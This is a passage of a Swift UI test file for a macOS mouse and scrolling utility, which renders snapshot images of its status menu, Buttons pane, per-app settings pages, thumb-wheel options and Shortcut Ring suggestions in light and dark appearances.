        let smoothing = StatusMenu.appSmoothingItem(front: safari, isScrollio: false, scrollingRuns: true,
                                                    rule: .usesScrollingSettings, scrollingSmooth: true, limitedToListedApps: false)
        func state(access: Bool = true, paused: Bool = false, problem: StatusMenu.StartProblem? = nil,
                   smoothing: StatusMenu.AppSmoothingItem? = nil) -> StatusMenu.State {
            var state = StatusMenu.State(hasAccess: access, isPaused: paused, showsDiagnostics: false,
                                         batteries: access && !paused && problem != .retrying ? batteries : [],
                                         appSmoothing: smoothing,
                                         updates: .check(enabled: true), startProblem: problem)
            state.isDebugBuild = false
            return state
        }
        for (name, shown) in [
            ("working", state(smoothing: smoothing)),
            ("paused", state(paused: true)),
            ("needs-access", state(access: false)),
            ("could-not-start", state(problem: .retrying)),
            ("tap-off", state(problem: .tapOff)),
        ] {
            let menu = NSMenu()
            StatusMenu.build(into: menu, state: shown, actions: actions)
            try renderMenuStandIn(menu.items, name: "status-menu-\(name)")
        }
    }

    /// "+" waits, then a listed button is pressed: the recorder is stubbed, nothing is
    /// recorded from the system.
    private func answer(_ buttons: PreferencesButtonsViewController, code: UInt16) {
        let recorder = KeyRecorder()
        buttons.onRecordingStarted(recorder)
        let event = InputEvent(type: .mouse, code: code, modifiers: [], phase: .down, source: .hidPP, device: nil)
        buttons.onEventRecorded(recorder, didRecordEvent: event, isDuplicate: true)
    }

    /// The rows' pictures: each part lit, buttons the drawing cannot show (with and
    /// without a number) and a key, on the list's box and on the selection, at their size
    /// on a Retina screen and at six times that.
    private func renderRowPictures() throws {
        let pictures: [ButtonTriggerPicture] = ButtonsMousePart.allCases.map { .mouse(part: $0, number: nil) }
            + [.mouse(part: nil, number: 5), .mouse(part: nil, number: 6), .mouse(part: nil, number: 12), .mouse(part: nil, number: nil), .key]
        let cell: CGFloat = 32
        let size = ButtonsMouseMiniature.size
        let bounds = NSRect(x: 0, y: 0, width: cell * CGFloat(pictures.count), height: cell * 2)
        for (suffix, appearanceName) in [("light", NSAppearance.Name.aqua), ("dark", .darkAqua)] {
            let appearance = try XCTUnwrap(NSAppearance(named: appearanceName))
            for scale in [CGFloat(2), 6] {
                let canvas = try XCTUnwrap(NSBitmapImageRep(
                    bitmapDataPlanes: nil, pixelsWide: Int(bounds.width * scale), pixelsHigh: Int(bounds.height * scale),
                    bitsPerSample: 8, samplesPerPixel: 4, hasAlpha: true, isPlanar: false,
                    colorSpaceName: .deviceRGB, bytesPerRow: 0, bitsPerPixel: 0
                ))
                canvas.size = bounds.size
                let context = try XCTUnwrap(NSGraphicsContext(bitmapImageRep: canvas))
                NSGraphicsContext.saveGraphicsState()
                NSGraphicsContext.current = context
                appearance.performAsCurrentDrawingAppearance {
                    NSColor.windowBackgroundColor.setFill()
                    bounds.fill()
                    PreferencesGroupedForm.boxFillColor.setFill()
                    NSRect(x: 0, y: cell, width: bounds.width, height: cell).fill()
                    NSColor.controlAccentColor.setFill()
                    NSRect(x: 0, y: 0, width: bounds.width, height: cell).fill()
                    for (index, picture) in pictures.enumerated() {
                        for (row, highlighted) in [(1, false), (0, true)] {
                            let frame = NSRect(
                                x: CGFloat(index) * cell + (cell - size.width) / 2,
                                y: CGFloat(row) * cell + (cell - size.height) / 2,
                                width: size.width, height: size.height
                            )
                            ButtonsMouseMiniature.image(for: picture, mouse: .mxMaster4, highlighted: highlighted).draw(in: frame)
                        }
                    }
                }
                NSGraphicsContext.restoreGraphicsState()
                let png = try XCTUnwrap(canvas.representation(using: .png, properties: [:]))
                try png.write(to: directory.appendingPathComponent("buttons-row-pictures-\(Int(scale))x-\(suffix).png"))
            }
        }
    }

    /// The mouse of the Buttons pane with nothing lit, then each part lit, side by side on
    /// the card's colour, at four times the size.
    private func renderMouseParts() throws {
        let size = ButtonsMouseArtworkView.size
        let parts: [ButtonsMousePart?] = [nil] + ButtonsMousePart.allCases
        let strip = NSView(frame: NSRect(x: 0, y: 0, width: size.width * CGFloat(parts.count), height: size.height))
        strip.wantsLayer = true
        for (index, part) in parts.enumerated() {
            let artwork = ButtonsMouseArtworkView()
            artwork.model = .mxMaster4
            artwork.frame.origin = NSPoint(x: size.width * CGFloat(index), y: 0)
            artwork.setEmphasis(part, animated: false)
            strip.addSubview(artwork)
        }
        for (suffix, appearanceName) in [("light", NSAppearance.Name.aqua), ("dark", .darkAqua)] {
            let appearance = try XCTUnwrap(NSAppearance(named: appearanceName))
            strip.appearance = appearance
            strip.display()
            let rep = try XCTUnwrap(strip.bitmapImageRepForCachingDisplay(in: strip.bounds))
            strip.cacheDisplay(in: strip.bounds, to: rep)
            let scale: CGFloat = 4
            let canvas = try XCTUnwrap(NSBitmapImageRep(
                bitmapDataPlanes: nil, pixelsWide: Int(strip.bounds.width * scale), pixelsHigh: Int(strip.bounds.height * scale),
                bitsPerSample: 8, samplesPerPixel: 4, hasAlpha: true, isPlanar: false,
                colorSpaceName: .deviceRGB, bytesPerRow: 0, bitsPerPixel: 0
            ))
            canvas.size = strip.bounds.size
            let context = try XCTUnwrap(NSGraphicsContext(bitmapImageRep: canvas))
            NSGraphicsContext.saveGraphicsState()
            NSGraphicsContext.current = context
            appearance.performAsCurrentDrawingAppearance {
                ScrollPreviewPalette.cardFill.setFill()
                strip.bounds.fill()
            }
            NSGraphicsContext.restoreGraphicsState()
            NSGraphicsContext.saveGraphicsState()
            NSGraphicsContext.current = context
            appearance.performAsCurrentDrawingAppearance {
                strip.displayIgnoringOpacity(strip.bounds, in: context)
            }
            NSGraphicsContext.restoreGraphicsState()
            let png = try XCTUnwrap(canvas.representation(using: .png, properties: [:]))
            try png.write(to: directory.appendingPathComponent("buttons-mouse-parts-\(suffix).png"))
        }
    }

    private func renderButtons(
        name: String,
        source: ButtonsDeviceSource,
        scrollKeys: [ScrollHotkey] = [],
        key: Bool = true,
        windowHeight: CGFloat? = nil,
        titled: TitledCut? = nil,
        then change: @escaping (PreferencesButtonsViewController) -> Void = { _ in }
    ) throws {
        try renderPane(PANEL_IDENTIFIER.buttons, name: name, key: key, windowHeight: windowHeight, titled: titled, prepare: { preferences in
            guard let buttons = preferences.controller(for: PANEL_IDENTIFIER.buttons) as? PreferencesButtonsViewController else { return }
            buttons.deviceSource = source
            buttons.scrollHoldKeys = { scrollKeys }
            buttons.startRecording = { _ in }
            buttons.openActionMenu = { _ in }
            buttons.presentPlaceMenu = { _, _ in }
        }, afterLoad: { controller in
            guard let buttons = controller as? PreferencesButtonsViewController else { return }
            buttons.headerView.prefersReducedMotion = { true }
            buttons.viewWillAppear()
            buttons.view.layoutSubtreeIfNeeded()
            change(buttons)
        })
    }

    /// The row that shows the stored binding at `index` (on an MX Master, a binding of one
    /// of its buttons is that button's row), and its id.
    private func row(_ buttons: PreferencesButtonsViewController, binding index: Int) -> ButtonBindingRow? {
        return buttons.row(for: buttons.rowID(forBinding: Options.shared.buttons.binding[index].id))
    }

    private func rowID(_ buttons: PreferencesButtonsViewController, binding index: Int) -> AnyHashable {
        return buttons.rowID(forBinding: Options.shared.buttons.binding[index].id)
    }

    /// Points at the row of the stored binding at `index`.
    private func hover(_ buttons: PreferencesButtonsViewController, binding index: Int) {
        guard let row = row(buttons, binding: index) else { return }
        hover(buttons, row: row)
    }

    /// Points at a row: a mouse-moved event handed to the list, never posted.
    private func hover(_ buttons: PreferencesButtonsViewController, row: PreferencesListRow) {
        guard let window = buttons.view.window else { return }
        window.contentView?.layoutSubtreeIfNeeded()
        let point = row.convert(NSPoint(x: row.bounds.midX, y: row.bounds.midY), to: nil)
        guard let event = NSEvent.mouseEvent(
            with: .mouseMoved, location: point, modifierFlags: [], timestamp: 0,
            windowNumber: window.windowNumber, context: nil, eventNumber: 0, clickCount: 0, pressure: 0
        ) else { return }
        buttons.list.mouseMoved(with: event)
    }

    /// The empty list (the limit off, and on with its muted line), and a list with apps (one
    /// with settings of its own, selected) and the switch on, in a key and a non-key window.
    func testRenderApps() throws {
        let stored = Options.shared.application.applications
        addTeardownBlock { Options.shared.application.applications = stored }
        Options.shared.application.applications = EnhanceArray<Application>(matchKey: "path")
        Options.shared.application.allowlist = false
        try renderPane(PANEL_IDENTIFIER.application, name: "apps-empty")
        Options.shared.application.allowlist = true
        try renderPane(PANEL_IDENTIFIER.application, name: "apps-empty-limit-on")

        let calculator = Application(path: "/System/Applications/Calculator.app")
        calculator.inherit = false
        let textEdit = Application(path: "/System/Applications/TextEdit.app/Contents/MacOS/TextEdit")
        let safari = Application(path: "/Applications/Safari.app")
        Options.shared.application.applications = EnhanceArray<Application>(withArray: [calculator, textEdit, safari], matchKey: "path")
        Options.shared.application.allowlist = true
        let selectCalculator: (NSViewController) -> Void = { controller in
            (controller as? PreferencesApplicationViewController)?.list.select(calculator.path)
        }
        try renderPane(PANEL_IDENTIFIER.application, name: "apps-with-apps", afterLoad: selectCalculator)
        try renderPane(PANEL_IDENTIFIER.application, name: "apps-with-apps-not-key", key: false, afterLoad: selectCalculator)
    }

    /// An app's page: with settings of its own and using the Scrolling settings (the switch
    /// alone), "Advanced" closed and open, as the pane shows it in place of the list.
    func testRenderAppPage() throws {
        let stored = Options.shared.application.applications
        addTeardownBlock { Options.shared.application.applications = stored }
        for advanced in [false, true] {
            for inherit in [false, true] {
                let calculator = Application(path: "/System/Applications/Calculator.app")
                calculator.inherit = inherit
                calculator.scroll.duration = ScrollFeel.direct.duration
                calculator.scroll.speed = 4.5
                Options.shared.application.applications = EnhanceArray<Application>(withArray: [calculator], matchKey: "path")
                let defaults = uiDefaults(advanced: advanced)
                let name = "app-page-\(inherit ? "inherit" : "own")-\(advanced ? "advanced" : "closed")"
                try renderPane(PANEL_IDENTIFIER.application, name: name, prepare: { preferences in
                    (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                        .uiStateDefaults = defaults
                }, afterLoad: { controller in
                    (controller as? PreferencesApplicationViewController)?.openApplication(withID: calculator.path)
                })
            }
        }
    }

    /// Each action's own "Reverse direction" and Switch Desktops' "Follow the wheel"
    /// (`thumb-wheel-options-<case>-<appearance>.png`): Scrolling › Thumb wheel with Switch
    /// Desktops, both switches on; with Volume, its reverse on (no follow row); the
    /// Buttons row's menu with "Show in Scrolling" (a stand-in drawn from the menu the
    /// row builds); an app's Scrolling part with its own Switch Desktops that follows.
    func testRenderThumbWheelOptions() throws {
        func scrolling(_ name: String) throws {
            try renderPane(PANEL_IDENTIFIER.scrolling, name: name, prepare: { preferences in
                (preferences.controller(for: PANEL_IDENTIFIER.scrolling) as? PreferencesScrollingViewController)?
                    .uiStateDefaults = self.uiDefaults(advanced: false)
            })
        }
        Options.shared.scroll = OPTIONS_SCROLL_DEFAULT()
        var desktops = ThumbWheelSettings(function: .desktops, followsWheel: true)
        desktops.reverses[.desktops] = true
        Options.shared.thumbWheel = desktops
        try scrolling("thumb-wheel-options-desktops")
        var volume = ThumbWheelSettings(function: .volume, speed: 1.5)
        volume.reverses[.volume] = true
        Options.shared.thumbWheel = volume
        try scrolling("thumb-wheel-options-volume")

        let row = ButtonsThumbWheelRow(function: .volume, mouse: .mxMaster4)
        try renderMenuStandIn(Array((row.pullDown.menu?.items ?? []).dropFirst()), name: "thumb-wheel-options-buttons-menu")

        let stored = Options.shared.application.applications
        addTeardownBlock { Options.shared.application.applications = stored }
        Options.shared.thumbWheel = .default
        let calculator = Application(path: "/System/Applications/Calculator.app")
        calculator.setUsesScrollingSettings(false, scrolling: Options.shared.scroll, thumbWheel: Options.shared.thumbWheel)
        calculator.setOwnThumbWheelScrolling(ThumbWheelSettings(function: .desktops, followsWheel: true))
        calculator.setOwnThumbWheelFunction(.desktops)
        Options.shared.application.applications = EnhanceArray<Application>(withArray: [calculator], matchKey: "path")
        let defaults = uiDefaults(advanced: false)
        try renderPane(PANEL_IDENTIFIER.application, name: "thumb-wheel-options-app-page", prepare: { preferences in
            (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                .uiStateDefaults = defaults
        }, afterLoad: { controller in
            (controller as? PreferencesApplicationViewController)?.openApplication(withID: calculator.path, part: .scrolling)
        })
    }

    /// An app's Scrolling part with its "Thumb wheel" box (`app-page-thumb-wheel-<case>-<appearance>.png`),
    /// Scrolling › Thumb wheel at "Switch Tabs", 1.5×, swapped: `inherit`, the app uses the
    /// Scrolling settings and has its own action, Zoom (the part is the switch alone: the
    /// action is set in the Buttons part); `own`, its own settings with its own 2×, not
    /// swapped, and Volume.
    func testRenderAppPageThumbWheel() throws {
        let stored = Options.shared.application.applications
        addTeardownBlock { Options.shared.application.applications = stored }
        Options.shared.thumbWheel = ThumbWheelSettings(function: .tabs, speed: 1.5, swapsDirection: true)
        for inherit in [true, false] {
            let calculator = Application(path: "/System/Applications/Calculator.app")
            if inherit {
                calculator.setOwnThumbWheelFunction(.zoom)
            } else {
                calculator.setUsesScrollingSettings(false, scrolling: Options.shared.scroll, thumbWheel: Options.shared.thumbWheel)
                calculator.setOwnThumbWheelScrolling(ThumbWheelSettings(speed: 2, swapsDirection: false))
                calculator.setOwnThumbWheelFunction(.volume)
            }
            Options.shared.application.applications = EnhanceArray<Application>(withArray: [calculator], matchKey: "path")
            let defaults = uiDefaults(advanced: false)
            try renderPane(PANEL_IDENTIFIER.application, name: "app-page-thumb-wheel-\(inherit ? "inherit" : "own")", prepare: { preferences in
                (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                    .uiStateDefaults = defaults
            }, afterLoad: { controller in
                (controller as? PreferencesApplicationViewController)?.openApplication(withID: calculator.path, part: .scrolling)
            })
        }
    }

    /// An app's Scrolling part as the switch leaves it (`app-scrolling-<case>-<appearance>.png`),
    /// the same app with its own thumb wheel action, Zoom: `on`, "Use settings from
    /// Scrolling" on and its box alone under the app's, as the Gestures and Shortcut Ring
    /// parts are with their switch on; `off`, the app's own settings under it, the Thumb
    /// wheel box with its line and "Reset to Defaults" at the end.
    func testRenderAppPageScrollingSwitch() throws {
        let stored = Options.shared.application.applications
        addTeardownBlock { Options.shared.application.applications = stored }
        for inherit in [true, false] {
            let safari = Application(path: "/Applications/Safari.app")
            safari.setUsesScrollingSettings(inherit, scrolling: Options.shared.scroll, thumbWheel: Options.shared.thumbWheel)
            safari.setOwnThumbWheelFunction(.zoom)
            Options.shared.application.applications = EnhanceArray<Application>(withArray: [safari], matchKey: "path")
            let defaults = uiDefaults(advanced: false)
            try renderPane(PANEL_IDENTIFIER.application, name: "app-scrolling-\(inherit ? "on" : "off")", prepare: { preferences in
                (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                    .uiStateDefaults = defaults
            }, afterLoad: { controller in
                (controller as? PreferencesApplicationViewController)?.openApplication(withID: safari.path, part: .scrolling)
            })
        }
    }

    /// An app's page with its "Shortcut Ring" section (`app-page-ring-<case>-<appearance>.png`):
    /// `off`, the app uses the general ring and the section is its switch alone; `own`,
    /// the switch is off and the app's own ring stands under it, the drawing and the
    /// eight rows, one of them an app to open, one a recorded key combination, one empty
    /// and the top one pointed at.
    func testRenderAppPageRing() throws {
        let stored = Options.shared.application.applications
        let savedRing = Options.shared.ring
        addTeardownBlock {
            Options.shared.application.applications = stored
            Options.shared.ring = savedRing
            ShortcutRingController.forgetPreparedFaces()
        }
        Options.shared.ring = .default
        for own in [false, true] {
            let calculator = Application(path: "/System/Applications/Calculator.app")
            if own {
                calculator.setUsesGeneralRing(false, general: .default)
                calculator.ring?[0] = ShortcutRingPlace(SystemShortcut.copy)
                calculator.ring?[2] = ShortcutRingPlace(openTarget: OpenTargetPayload(
                    path: "/System/Applications/TextEdit.app", bundleID: "com.apple.TextEdit", arguments: "", kind: .application
                ))
                calculator.ring?[5] = ShortcutRingPlace(action: "custom::40:1179648")
                calculator.ring?[6] = .empty
            }
            Options.shared.application.applications = EnhanceArray<Application>(withArray: [calculator], matchKey: "path")
            let defaults = uiDefaults(advanced: false)
            try renderPane(PANEL_IDENTIFIER.application, name: "app-page-ring-\(own ? "own" : "off")", prepare: { preferences in
                (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                    .uiStateDefaults = defaults
            }, afterLoad: { controller in
                let apps = controller as? PreferencesApplicationViewController
                apps?.openApplication(withID: calculator.path, part: .ring)
                apps?.detailController?.ringController?.placeHoverChanged(0, inside: true)
            })
        }
    }

    /// The Shortcut Ring part of apps with suggested shortcuts, right after "Use the
    /// general ring" was turned off (`app-ring-suggested-<app>-<appearance>.png`): the
    /// ring holds the suggestion, on the US layout, and the row says so (Outlook's bottom
    /// place is empty on purpose). Then Safari's, Finder's and Outlook's on German QWERTZ
    /// (`-<app>-qwertz`: Back and Forward are Scrollio's own in Safari; Finder's and
    /// Outlook's "[" and "]" places stay empty, and the row says how many) and Figma's
    /// after one place was changed (`-figma-changed`, the row offers the suggestion
    /// again). The apps need not be on this Mac: the entries get their bundle identifiers
    /// through the seam.
    func testRenderAppPageRingSuggested() throws {
        let stored = Options.shared.application.applications
        let savedRing = Options.shared.ring
        let savedIdentifier = ShortcutRingSuggestions.bundleIdentifierOfApplication
        let savedLayout = ShortcutRingSuggestions.layout
        addTeardownBlock {
            Options.shared.application.applications = stored
            Options.shared.ring = savedRing
            ShortcutRingSuggestions.bundleIdentifierOfApplication = savedIdentifier
            ShortcutRingSuggestions.layout = savedLayout
            ShortcutRingController.forgetPreparedFaces()
            ButtonUtils.shared.invalidateCache()
        }
        Options.shared.ring = .default
        // A button opens the ring, so the switch's line says which ring opens.
        Options.shared.buttons.binding = [binding(1000, SystemShortcut.shortcutRing.identifier)]
        ButtonUtils.shared.invalidateCache()
        let apps: [(file: String, name: String, path: String, identifier: String)] = [
            ("figma", "Figma", "/Applications/Figma.app", "com.figma.Desktop"),
            ("photoshop", "Adobe Photoshop 2026", "/Applications/Adobe Photoshop 2026/Adobe Photoshop 2026.app", "com.adobe.Photoshop"),
            ("safari", "Safari", "/Applications/Safari.app", "com.apple.Safari"),
            ("word", "Microsoft Word", "/Applications/Microsoft Word.app", "com.microsoft.Word"),
            ("final-cut-pro", "Final Cut Pro", "/Applications/Final Cut Pro.app", "com.apple.FinalCut"),
            ("finder", "Finder", "/System/Library/CoreServices/Finder.app", "com.apple.finder"),
            ("outlook", "Microsoft Outlook", "/Applications/Microsoft Outlook.app", "com.microsoft.Outlook"),
        ]
        let identifiers = Dictionary(uniqueKeysWithValues: apps.map { ($0.path, $0.identifier) })
        ShortcutRingSuggestions.bundleIdentifierOfApplication = { identifiers[$0] }

        func render(_ app: (file: String, name: String, path: String, identifier: String), suffix: String = "",
                    switchesOff: Bool = true, afterSwitch: @escaping (Application) -> Void = { _ in }) throws {
            let entry = Application(path: app.path)
            entry.displayName = app.name
            Options.shared.application.applications = EnhanceArray<Application>(withArray: [entry], matchKey: "path")
            let defaults = uiDefaults(advanced: false)
            try renderPane(PANEL_IDENTIFIER.application, name: "app-ring-suggested-\(app.file)\(suffix)", prepare: { preferences in
                (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                    .uiStateDefaults = defaults
            }, afterLoad: { controller in
                let pane = controller as? PreferencesApplicationViewController
                pane?.openApplication(withID: app.path, part: .ring)
                guard let part = pane?.detailController?.ringPart else { return }
                // Each appearance starts from the general ring, as the user finds it.
                entry.ring = nil
                part.syncViewWithOptions()
                guard switchesOff else { return }
                part.generalRingRow.toggle.state = .off
                part.generalRingClick(part.generalRingRow.toggle)
                afterSwitch(entry)
                part.syncViewWithOptions()
            })
        }

        ShortcutRingSuggestions.layout = { .us }
        // Before the switch: the part offers the suggested shortcuts (`-figma-offer`).
        try render(apps[0], suffix: "-offer", switchesOff: false)
        for app in apps {
            try render(app)
        }
        try render(apps[0], suffix: "-changed") { entry in
            entry.ring?[1] = ShortcutRingPlace(SystemShortcut.find)
        }
        if let german = TISCreateInputSourceList(
            [kTISPropertyInputSourceID as String: "com.apple.keylayout.German"] as CFDictionary, true
        )?.takeRetainedValue() as? [TISInputSource], let source = german.first, let layers = KeyboardLayoutLayers.of(source) {
            ShortcutRingSuggestions.layout = { layers }
            for app in apps where ["safari", "finder", "outlook"].contains(app.file) {
                try render(app, suffix: "-qwertz")
            }
        }
    }

    /// The Shortcut Ring part of apps of the second fifty, right after "Use the general
    /// ring" was turned off (`app-ring-suggested-<app>-<appearance>.png`, US layout): Dia,
    /// Discord, GitHub Desktop (Fetch where it pushed), Zed and Calendar. Then Zed with a
    /// ring of its own made before there were suggestions, a copy of the general ring
    /// (`-zed-by-hand`): the row says what "Reset to Defaults" does instead of where the
    /// ring started.
    func testRenderAppPageRingSuggestedSecondFifty() throws {
        let stored = Options.shared.application.applications
        let savedRing = Options.shared.ring
        let savedIdentifier = ShortcutRingSuggestions.bundleIdentifierOfApplication
        let savedLayout = ShortcutRingSuggestions.layout
        addTeardownBlock {
            Options.shared.application.applications = stored
            Options.shared.ring = savedRing
            ShortcutRingSuggestions.bundleIdentifierOfApplication = savedIdentifier
            ShortcutRingSuggestions.layout = savedLayout
            ShortcutRingController.forgetPreparedFaces()
            ButtonUtils.shared.invalidateCache()
        }
        Options.shared.ring = .default
        // A button opens the ring, so the switch's line says which ring opens.
        Options.shared.buttons.binding = [binding(1000, SystemShortcut.shortcutRing.identifier)]
        ButtonUtils.shared.invalidateCache()
        let apps: [(file: String, name: String, path: String, identifier: String)] = [
            ("dia", "Dia", "/Applications/Dia.app", "company.thebrowser.dia"),
            ("discord", "Discord", "/Applications/Discord.app", "com.hnc.Discord"),
            ("github-desktop", "GitHub Desktop", "/Applications/GitHub Desktop.app", "com.github.GitHubClient"),
            ("zed", "Zed", "/Applications/Zed.app", "dev.zed.Zed"),
            ("calendar", "Calendar", "/System/Applications/Calendar.app", "com.apple.iCal"),
        ]
        let identifiers = Dictionary(uniqueKeysWithValues: apps.map { ($0.path, $0.identifier) })
        ShortcutRingSuggestions.bundleIdentifierOfApplication = { identifiers[$0] }
        ShortcutRingSuggestions.layout = { .us }

        func render(_ app: (file: String, name: String, path: String, identifier: String), byHand: Bool = false) throws {
            let entry = Application(path: app.path)
            entry.displayName = app.name
            Options.shared.application.applications = EnhanceArray<Application>(withArray: [entry], matchKey: "path")
            let defaults = uiDefaults(advanced: false)
            try renderPane(PANEL_IDENTIFIER.application, name: "app-ring-suggested-\(app.file)\(byHand ? "-by-hand" : "")", prepare: { preferences in
                (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                    .uiStateDefaults = defaults
            }, afterLoad: { controller in
                let pane = controller as? PreferencesApplicationViewController
                pane?.openApplication(withID: app.path, part: .ring)
                guard let part = pane?.detailController?.ringPart else { return }
                // Each appearance starts from the general ring, as the user finds it.
                entry.ring = nil
                part.syncViewWithOptions()
                if byHand {
                    // A ring of its own from before the suggestions: a copy of the general ring.
                    entry.setUsesGeneralRing(false, general: Options.shared.ring, suggested: nil)
                } else {
                    part.generalRingRow.toggle.state = .off
                    part.generalRingClick(part.generalRingRow.toggle)
                }
                part.syncViewWithOptions()
            })
        }

        for app in apps {
            try render(app)
        }
        try render(apps[3], byHand: true)
    }

    /// An app's page in parts and the marks of the list (`app-page-<part>-<appearance>.png`,
    /// `apps-list-marks-<appearance>.png`): Scrolling with the app's own settings; Buttons
    /// with two rows of the app's own on an MX Master 3S (one with an action, one
    /// "Default" on a Logitech button no binding of Buttons uses); Buttons without own
    /// rows; the Gestures part with the app's own gestures (a named key combination up,
    /// Back and Forward on the sides) and with the switch alone (`app-page-gestures-own`,
    /// `-general`); the Shortcut Ring part with the app's own ring; the list with an app
    /// that has all four kinds of its own, one with scrolling only and one with none.
    func testRenderAppPageParts() throws {
        let stored = Options.shared.application.applications
        let savedRing = Options.shared.ring
        let savedGesture = Options.shared.gesture
        addTeardownBlock {
            Options.shared.application.applications = stored
            Options.shared.ring = savedRing
            Options.shared.gesture = savedGesture
            ShortcutRingController.forgetPreparedFaces()
            ButtonUtils.shared.invalidateCache()
        }
        Options.shared.ring = .default
        Options.shared.gesture = .default
        Options.shared.buttons.binding = [
            binding(3, SystemShortcut.navigateBack.identifier),
            binding(4, SystemShortcut.missionControl.identifier),
        ]
        let mouse = ButtonsDeviceSource(
            captureStatus: { _ in .normal }, deviceName: { "MX Master 3S" }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in }
        )
        let safari = Application(path: "/Applications/Safari.app")
        safari.inherit = false
        safari.setOwnButtonBindings([
            ButtonBinding(triggerEvent: RecordedEvent(type: .mouse, code: 4, modifiers: 0, deviceFilter: nil),
                          systemShortcutName: SystemShortcut.appExpose.identifier),
            ButtonBinding(triggerEvent: RecordedEvent(type: .mouse, code: 1000, modifiers: 0, deviceFilter: nil),
                          systemShortcutName: "", isEnabled: true),
        ])
        safari.setUsesGeneralRing(false, general: .default)
        safari.ring?[0] = ShortcutRingPlace(SystemShortcut.copy)
        safari.setUsesGeneralGestures(false, general: .default)
        var gestures = GestureActions.default
        gestures.up = GestureAction(action: "custom::15:1179648", label: ShortcutLabel(name: "Reload", icon: .symbol("arrow.clockwise")))
        gestures.left = GestureAction(SystemShortcut.navigateBack)
        gestures.right = GestureAction(SystemShortcut.navigateForward)
        safari.setOwnGestures(actions: gestures, invertHorizontal: false)
        let calculator = Application(path: "/System/Applications/Calculator.app")
        calculator.inherit = false
        let textEdit = Application(path: "/System/Applications/TextEdit.app")
        Options.shared.application.applications = EnhanceArray<Application>(withArray: [safari, calculator, textEdit], matchKey: "path")

        func page(_ name: String, app: Application, part: ApplicationPagePart) throws {
            let defaults = uiDefaults(advanced: false)
            try renderPane(PANEL_IDENTIFIER.application, name: name, prepare: { preferences in
                (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                    .uiStateDefaults = defaults
            }, afterLoad: { controller in
                let apps = controller as? PreferencesApplicationViewController
                apps?.openApplication(withID: app.path, part: part)
                apps?.detailController?.buttonsPart.deviceSource = mouse
                apps?.detailController?.buttonsPart.reloadRows()
            })
        }
        try page("app-page-scrolling", app: safari, part: .scrolling)
        try page("app-page-buttons", app: safari, part: .buttons)
        try page("app-page-buttons-empty", app: calculator, part: .buttons)
        try page("app-page-gestures-own", app: safari, part: .gestures)
        try page("app-page-gestures-general", app: calculator, part: .gestures)
        try page("app-page-ring", app: safari, part: .ring)
        try renderPane(PANEL_IDENTIFIER.application, name: "apps-list-marks", afterLoad: { controller in
            (controller as? PreferencesApplicationViewController)?.list.select(calculator.path)
        })
    }

    /// "Reset to Defaults" at the bottom of an app's parts, and the parts folded while
    /// nothing runs them with the app in front (`app-reset-<part>`, `app-fold-<case>`,
    /// `-<appearance>.png`): Safari, whose own ring, gestures and buttons differ from where
    /// they start, while a button of Buttons opens the ring and runs the gestures
    /// (`app-reset-ring`, `-gestures`, `-buttons`: the button on, nothing folded);
    /// Calculator's own ring and gestures while nothing opens the ring or runs the gestures
    /// (`app-fold-ring`, `app-fold-gestures`: "Shortcuts ›" and "Directions ›" folded), the
    /// ring opened by a click (`app-fold-ring-open`) and its Buttons part without buttons of
    /// its own (`app-reset-buttons-empty`: the button off).
    func testRenderAppPageResetAndFold() throws {
        let stored = Options.shared.application.applications
        let savedRing = Options.shared.ring
        addTeardownBlock {
            Options.shared.application.applications = stored
            Options.shared.ring = savedRing
            ShortcutRingController.forgetPreparedFaces()
            ButtonUtils.shared.invalidateCache()
        }
        Options.shared.ring = .default
        Options.shared.gesture = .default
        let mouse = ButtonsDeviceSource(
            captureStatus: { _ in .normal }, deviceName: { "MX Master 3S" }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in }
        )
        let safari = Application(path: "/Applications/Safari.app")
        safari.setOwnButtonBindings([
            ButtonBinding(triggerEvent: RecordedEvent(type: .mouse, code: 4, modifiers: 0, deviceFilter: nil),
                          systemShortcutName: SystemShortcut.appExpose.identifier),
        ])
        safari.setOwnThumbWheelFunction(.tabs)
        safari.setUsesGeneralRing(false, general: .default)
        safari.ring?[0] = ShortcutRingPlace(SystemShortcut.copy)
        safari.setUsesGeneralGestures(false, general: .default)
        var gestures = GestureActions.default
        gestures.left = GestureAction(SystemShortcut.navigateBack)
        gestures.right = GestureAction(SystemShortcut.navigateForward)
        safari.setOwnGestures(actions: gestures, invertHorizontal: false)
        let calculator = Application(path: "/System/Applications/Calculator.app")
        calculator.setUsesGeneralRing(false, general: .default)
        calculator.setUsesGeneralGestures(false, general: .default)
        Options.shared.application.applications = EnhanceArray<Application>(withArray: [safari, calculator], matchKey: "path")

        func page(_ name: String, app: Application, part: ApplicationPagePart,
                  after: @escaping (ApplicationDetailViewController) -> Void = { _ in }) throws {
            let defaults = uiDefaults(advanced: false)
            try renderPane(PANEL_IDENTIFIER.application, name: name, prepare: { preferences in
                (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                    .uiStateDefaults = defaults
            }, afterLoad: { controller in
                let apps = controller as? PreferencesApplicationViewController
                apps?.openApplication(withID: app.path, part: part)
                guard let detail = apps?.detailController else { return }
                detail.buttonsPart.deviceSource = mouse
                detail.buttonsPart.reloadRows()
                after(detail)
            })
        }
        // A button opens the ring and another runs the gestures: nothing folds.
        Options.shared.buttons.binding = [
            binding(3, SystemShortcut.mouseGestureNavigation.identifier),
            binding(1001, SystemShortcut.shortcutRing.identifier),
        ]
        ButtonUtils.shared.invalidateCache()
        try page("app-reset-ring", app: safari, part: .ring)
        try page("app-reset-gestures", app: safari, part: .gestures)
        try page("app-reset-buttons", app: safari, part: .buttons)
        try page("app-reset-buttons-empty", app: calculator, part: .buttons)
        // Nothing opens the ring or runs the gestures.
        Options.shared.buttons.binding = []
        ButtonUtils.shared.invalidateCache()
        try page("app-fold-ring", app: calculator, part: .ring)
        try page("app-fold-ring-open", app: calculator, part: .ring) { detail in
